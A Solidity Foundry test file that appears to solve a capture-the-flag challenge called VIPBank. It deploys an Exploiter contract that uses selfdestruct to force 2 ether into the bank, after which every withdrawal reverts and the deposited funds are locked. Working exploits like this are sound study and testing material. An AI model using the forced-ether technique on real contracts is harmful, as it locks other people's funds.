// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VIPBank} from "./challenge/VIPBank.sol";

/// Define the Exploiter contract
contract Exploiter {
    /// make constructor payable to recieve ether during deployment
    constructor() payable {}

    /// calls `selfdestruct` to force send ether to the recipient address
    function exploit(address payable _recipient) external {
        selfdestruct(_recipient);
    }
}

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    address manager = 0xE48A248367d3BC49069fA01A26B7517756E32a52;
    VIPBank vipBank;

    function setUp() public {
        vm.prank(manager);
        vipBank = new VIPBank();
        vm.deal(playerAddr, 3 ether);
    }

    function testExploit() external {
        /// add player address as VIP
        vm.prank(manager);
        vipBank.addVIP(playerAddr);

        vm.startPrank(playerAddr, playerAddr);
        /// deposit some funds
        vipBank.deposit{value: 0.05 ether}();

        /// make sure that the balances for this address got updated
        assertEq(vipBank.balances(playerAddr), 0.05 ether);

        Exploiter exploiter = new Exploiter{value: 2 ether}();
        /// force send ether to the vipBank contract
        exploiter.exploit(payable(address(vipBank)));

        /// funds got locked!
        vm.expectRevert(abi.encodePacked("Cannot withdraw more than 0.5 ETH per transaction"));

        vipBank.withdraw(0.05 ether);
        vm.stopPrank();
    }
}
